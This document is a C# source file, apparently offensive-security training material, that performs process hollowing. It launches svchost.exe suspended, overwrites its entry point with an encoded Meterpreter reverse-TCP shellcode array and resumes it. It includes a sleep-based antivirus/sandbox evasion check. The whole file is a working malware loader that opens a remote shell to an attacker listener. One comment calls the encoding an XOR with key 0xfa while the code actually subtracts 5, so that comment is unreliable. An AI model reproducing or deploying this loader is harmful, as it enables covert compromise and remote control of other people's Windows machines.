using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp
            // XORed with key 0xfa
            byte[] buf = new byte[510] { 0x01, 0x4d, 0x88, 0xe9, 0xf5, 0xed, 0xd1, 0x05, 0x05, 0x05, 0x46, 0x56, 0x46, 0x55, 0x57, 0x4d, 0x36, 0xd7, 0x6a, 0x4d, 0x90, 0x57, 0x65, 0x56, 0x4d, 0x90, 0x57, 0x1d, 0x4d, 0x90, 0x57, 0x25, 0x5b, 0x52, 0x36, 0xce, 0x4d, 0x90, 0x77, 0x55, 0x4d, 0x14, 0xbc, 0x4f, 0x4f, 0x4d, 0x36, 0xc5, 0xb1, 0x41, 0x66, 0x81, 0x07, 0x31, 0x25, 0x46, 0xc6, 0xce, 0x12, 0x46, 0x06, 0xc6, 0xe7, 0xf2, 0x57, 0x46, 0x56, 0x4d, 0x90, 0x57, 0x25, 0x90, 0x47, 0x41, 0x4d, 0x06, 0xd5, 0x6b, 0x86, 0x7d, 0x1d, 0x10, 0x07, 0x14, 0x8a, 0x77, 0x05, 0x05, 0x05, 0x90, 0x85, 0x8d, 0x05, 0x05, 0x05, 0x4d, 0x8a, 0xc5, 0x79, 0x6c, 0x4d, 0x06, 0xd5, 0x55, 0x90, 0x4d, 0x1d, 0x49, 0x90, 0x45, 0x25, 0x4e, 0x06, 0xd5, 0xe8, 0x5b, 0x52, 0x36, 0xce, 0x4d, 0x04, 0xce, 0x46, 0x90, 0x39, 0x8d, 0x4d, 0x06, 0xdb, 0x4d, 0x36, 0xc5, 0xb1, 0x46, 0xc6, 0xce, 0x12, 0x46, 0x06, 0xc6, 0x3d, 0xe5, 0x7a, 0xf6, 0x51, 0x08, 0x51, 0x29, 0x0d, 0x4a, 0x3e, 0xd6, 0x7a, 0xdd, 0x5d, 0x49, 0x90, 0x45, 0x29, 0x4e, 0x06, 0xd5, 0x6b, 0x46, 0x90, 0x11, 0x4d, 0x49, 0x90, 0x45, 0x21, 0x4e, 0x06, 0xd5, 0x46, 0x90, 0x09, 0x8d, 0x4d, 0x06, 0xd5, 0x46, 0x5d, 0x46, 0x5d, 0x63, 0x5e, 0x5f, 0x46, 0x5d, 0x46, 0x5e, 0x46, 0x5f, 0x4d, 0x88, 0xf1, 0x25, 0x46, 0x57, 0x04, 0xe5, 0x5d, 0x46, 0x5e, 0x5f, 0x4d, 0x90, 0x17, 0xee, 0x50, 0x04, 0x04, 0x04, 0x62, 0x4e, 0xc3, 0x7c, 0x78, 0x37, 0x64, 0x38, 0x37, 0x05, 0x05, 0x46, 0x5b, 0x4e, 0x8e, 0xeb, 0x4d, 0x86, 0xf1, 0xa5, 0x06, 0x05, 0x05, 0x4e, 0x8e, 0xea, 0x4e, 0xc1, 0x07, 0x05, 0x06, 0xc0, 0xc5, 0xad, 0x32, 0xb6, 0x46, 0x59, 0x4e, 0x8e, 0xe9, 0x51, 0x8e, 0xf6, 0x46, 0xbf, 0x51, 0x7c, 0x2b, 0x0c, 0x04, 0xda, 0x51, 0x8e, 0xef, 0x6d, 0x06, 0x06, 0x05, 0x05, 0x5e, 0x46, 0xbf, 0x2e, 0x85, 0x70, 0x05, 0x04, 0xda, 0x6f, 0x0f, 0x46, 0x63, 0x55, 0x55, 0x52, 0x36, 0xce, 0x52, 0x36, 0xc5, 0x4d, 0x04, 0xc5, 0x4d, 0x8e, 0xc7, 0x4d, 0x04, 0xc5, 0x4d, 0x8e, 0xc6, 0x46, 0xbf, 0xef, 0x14, 0xe4, 0xe5, 0x04, 0xda, 0x4d, 0x8e, 0xcc, 0x6f, 0x15, 0x46, 0x5d, 0x51, 0x8e, 0xe7, 0x4d, 0x8e, 0xfe, 0x46, 0xbf, 0x9e, 0xaa, 0x79, 0x66, 0x04, 0xda, 0x8a, 0xc5, 0x79, 0x0f, 0x4e, 0x04, 0xd3, 0x7a, 0xea, 0xed, 0x98, 0x05, 0x05, 0x05, 0x4d, 0x88, 0xf1, 0x15, 0x4d, 0x8e, 0xe7, 0x52, 0x36, 0xce, 0x6f, 0x09, 0x46, 0x5d, 0x4d, 0x8e, 0xfe, 0x46, 0xbf, 0x07, 0xde, 0xcd, 0x64, 0x04, 0xda, 0x88, 0xfd, 0x05, 0x83, 0x5a, 0x4d, 0x88, 0xc9, 0x25, 0x63, 0x8e, 0xfb, 0x6f, 0x45, 0x46, 0x5e, 0x6d, 0x05, 0x15, 0x05, 0x05, 0x46, 0x5d, 0x4d, 0x8e, 0xf7, 0x4d, 0x36, 0xce, 0x46, 0xbf, 0x5d, 0xa9, 0x58, 0xea, 0x04, 0xda, 0x4d, 0x8e, 0xc8, 0x4e, 0x8e, 0xcc, 0x52, 0x36, 0xce, 0x4e, 0x8e, 0xf5, 0x4d, 0x8e, 0xdf, 0x4d, 0x8e, 0xfe, 0x46, 0xbf, 0x07, 0xde, 0xcd, 0x64, 0x04, 0xda, 0x88, 0xfd, 0x05, 0x82, 0x2d, 0x5d, 0x46, 0x5c, 0x5e, 0x6d, 0x05, 0x45, 0x05, 0x05, 0x46, 0x5d, 0x6f, 0x05, 0x5f, 0x46, 0xbf, 0x10, 0x34, 0x14, 0x35, 0x04, 0xda, 0x5c, 0x5e, 0x46, 0xbf, 0x7a, 0x73, 0x52, 0x66, 0x04, 0xda, 0x4e, 0x04, 0xd3, 0xee, 0x41, 0x04, 0x04, 0x04, 0x4d, 0x06, 0xc8, 0x4d, 0x2e, 0xcb, 0x4d, 0x8a, 0xfb, 0x7a, 0xb9, 0x46, 0x04, 0xec, 0x5d, 0x6f, 0x05, 0x5e, 0x4e, 0xcc, 0xc7, 0xf5, 0xba, 0xa7, 0x5b, 0x04, 0xda };
            // Start 'svchost.exe' in a suspended state
            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.");

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            Console.WriteLine($"Got process information and located PEB address of process at {"0x" + baseImageAddr.ToString("x")}. Success: {qResult == 0}.");

            // Get entry point of the actual process executable
            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
            // From the PEB (address we got in last call), we have to do the following:
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            Console.WriteLine($"DEBUG: Executable base address: {"0x" + executableAddress.ToString("x")}.");

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            Console.WriteLine($"Got executable entrypoint address: {"0x" + entrypointAddr.ToString("x")}.");

            // Carrying on, decode the XOR payload
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 5) & 0xff);
            }
            Console.WriteLine("XOR-decoded payload.");

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);
            Console.WriteLine($"Overwrote entrypoint with payload. Success: {result}.");

            // Resume the thread to trigger our payload
            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Triggered payload. Success: {rResult == 1}. Check your listener!");
        }
    }
}